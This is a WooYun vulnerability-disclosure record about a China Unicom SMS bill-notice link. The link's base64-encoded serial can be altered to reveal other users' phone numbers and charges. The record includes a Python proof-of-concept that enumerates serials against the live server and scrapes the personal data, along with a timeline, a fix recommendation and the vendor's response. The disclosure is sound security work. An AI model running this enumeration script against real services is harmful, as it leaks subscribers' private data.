{"id": 47387, "wybug_id": "wooyun-2014-086939", "wybug_title": "中国联通短信话费通知链接泄露用户信息", "wybug_corp": "中国联通", "wybug_author": "路人甲", "wybug_date": "2014-12-12 16:57", "wybug_open_date": "2015-01-26 16:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向公众公开  简要描述： 中国联通短信话费通知提供一个链接，通过变更URL，可以查询到其他用户的手机号的消费记录（可能可以精确到月）可以利用获取到的信息, 进行对手机用户的进一步欺骗和钓鱼. 泄露的手机号码和消费记录也可以推测出使用者的垃圾短信利用价值 详细说明：  收到短信话费提醒通知（为了保护自己的隐私已经打码）\n\n链接为: http://114.247.0.103:8080/bill/d.h?attrs=XXXXXXXX直接使用了IP+端口的URL，粗看以为是钓鱼短信。用curl获取到页面代码后，发现居然真的是官方页面……费用什么的都是正确的，引用的也是wo.cn的资源(js/css什么的)考虑到链接的attr属性非常像base64编码, 尝试解码:\n\n发现是简单的日期和一些序号组成, 经过验证, 简单的修改序号即可查询到其他人的手机号码和话费.   漏洞证明：  由于时间限制, 暂时只进行了很浅的信息抓取, 有理由相信可以深入挖掘出不少信息.验证脚本\n#!/usr/bin/env python# -*- encoding: utf-8 -*-import hashlibimport httplibimport refrom base64 import b64encode, b64decodeHOST = \"114.247.0.103:8080\"PATH = \"\"\"/bill/d.h?attrs=\"\"\"PROG = re.compile('<div class=\"mobile\">[0-9]+<')RMB_PROG = re.compile('<div class=\"rmb\">.*<')# RMB_PROG = re.compile('<div class=\"rmb\">[0-9]+\\.[0-9]+<')def get(path):    conn = httplib.HTTPConnection(HOST, timeout=3)    conn.request(\"GET\", path)    rsp = conn.getresponse()    print(rsp.status, rsp.reason)    text = rsp.read()    match = PROG.search(text)        if match is not None:        span = match.span()        print(text[span[0]:span[1]])    match = RMB_PROG.search(text)    if match is not None:        span = match.span()        print(text[span[0]:span[1]])    # with open(\"t.log\", \"wb\") as fp:    #     fp.write(rsp.read())def gen_serial():    # for i in range(108350, 118350):    for i in range(1084, 1088):        yield str(i) + \"5020141225020141109713411\"def main():    for s in gen_serial():        get(PATH + b64encode(s))if __name__ == \"__main__\":    main()\n验证结果\n\n   修复方案：  URL中使用的标识字符串不能暴露任何业务/用户相关信息, 并且不能被简单的碰撞出正确的标识字符串   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-16 18:22 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道中国联通通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-12 16:59 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  有点意思    \n     2014-12-12 21:14 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  厂商已忽略~哈哈    \n     2014-12-16 19:09 |    \t\t草榴社区 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:26        | 未满18周岁,不准进入.)\t\t \n  http://114.247.0.103:8080/bill/d.h?  这个么?没看出来怎么加密的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}